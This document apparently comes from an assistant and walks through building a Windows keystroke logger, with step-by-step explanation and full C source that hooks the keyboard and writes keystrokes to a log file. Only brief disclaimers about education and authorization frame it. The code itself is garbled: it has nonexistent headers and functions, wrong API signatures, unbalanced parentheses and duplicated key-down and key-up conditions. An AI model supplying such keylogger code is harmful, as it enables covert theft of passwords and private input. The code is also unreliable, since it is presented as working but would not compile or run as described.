To create a keystroke-logging application on a Windows computer, follow these steps:

### Step-by-Step Explanation

1. **Disclaimer**: This code is provided for educational purposes only. It should be used responsibly and with proper authorization.

2. **Include Necessary Headers**: Use the Windows header files to access keyboard functions.
   ```c
   #include <windows.h>
   #include <commctrl.h>
   #include <thread.h>
   #include <ctime>
   ```

3. **Define the Callback Function**: This function will handle keyboard events.
   ```c
   static LRESULT CALLBACK keyboardHook(int nCode, int wParam, int lParam);
   ```

4. **Keyboard Hook Setup**: Install the keyboard hook in the main function.
   ```c
   HHOOK hKeyboardHook = NULL;
   hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);
   ```

5. **Message Loop**: Use a message loop to handle events and ensure the application remains responsive.
   ```c
   MSG msg;
   while (GetMessage(&msg, 0)) {
       TranslateMessage(&msg);
       DispatchMessage(&msg);
   }
   ```

6. **Callback Function Implementation**: Check each key press and log it.
   ```c
   static LRESULT CALLBACK keyboardHook(int nCode, int wParam, int lParam) {
       if (nCode == HC_ACTION) {
           BYTE keys = (BYTE)(lParam);
           if ((wParam & (1 << 31)) { // Key down
               // Determine if the key is a modifier
               if (keys & 0x1F) {
                   // Modifier keys (Shift, Ctrl, Alt, etc.)
               } else {
                   // Regular key
                   // Convert to character and log
                   char c = (char)keys;
                   // Write to log file or buffer
               }
           } else if ((wParam & (1 << 31)) { // Key up
               // Handle key release
           }
       }
       return 0;
   }
   ```

7. **Handle Key State**: Use `GetKeyState` to check if a key is pressed.
   ```c
   BYTE currentState = GetKeyState(0);
   if ((currentState >> n) & 1) {
       // Key is pressed
   }
   ```

8. **Log Keystrokes**: Collect and store the keystrokes in a file or buffer.
   - Create a file handle.
   - Write each keystroke to the file as it occurs.

9. **Thread for File Writing**: To prevent blocking the main thread, use a separate thread for writing to the file.

10. **Uninstall the Hook**: Properly remove the hook when the program exits.
    ```c
    if (hKeyboardHook) {
        RemoveWindowHook(hKeyboardHook);
    }
    ```

### Example Code

```c
#include <windows.h>
#include <commctrl.h>
#include <thread.h>
#include <ctime>

// Global variable to store the log
char logBuffer[1024];
int logIndex = 0;

// Function prototypes
void InitializeLogFile(void);
void WriteLog(void);

static LRESULT CALLBACK keyboardHook(int nCode, int wParam, int lParam) {
    if (nCode == HC_ACTION) {
        BYTE keys = (BYTE)(lParam);
        if ((wParam & (1 << 31)) { // Key down
            if (keys & 0x1F) {
                // Modifier keys (Shift, Ctrl, Alt, etc.) - log as is
                logBuffer[logIndex++] = keys;
            } else {
                // Regular character
                char c = (char)keys;
                logBuffer[logIndex++] = c;
                logBuffer[logIndex++] = '\n';
            }
        } else if ((wParam & (1 << 31)) { // Key up
            // Handle key release - not logged here
        }
    }
    return 0;
}

void InitializeLogFile(void) {
    FILE *file = fopen("keyboard.log", "a");
    if (file) {
        fputs("Keyboard Logging Started at: ", file);
        time_t now;
        time(&now);
        fputs(ctime(&now), file);
        fclose(file);
    }
}

void WriteLog(void) {
    if (logIndex > 0) {
        FILE *file = fopen("keyboard.log", "a");
        if (file) {
            fwrite(logBuffer, file, sizeof(logBuffer), file);
            fclose(file);
        }
    }
}

int main() {
    HHOOK hKeyboardHook = NULL;
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);

    InitializeLogFile();

    // Create a separate thread to write to the log file
    HANDLE hWriteThread = CreateThread(0, 0, WriteLog, 0, 0, &hWriteThread);

    MSG msg;
    while (GetMessage(&msg, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Terminate the write thread and remove the hook
    if (hWriteThread) {
        WaitForSingleObject(hWriteThread, INFINITE);
        CloseHandle(hWriteThread);
    }

    if (hKeyboardHook) {
        RemoveWindowHook(hKeyboardHook);
    }

    return 0;
}
```

### Key Considerations

- **Ethical Use**: Ensure this code is used ethically and legally, with proper authorization.
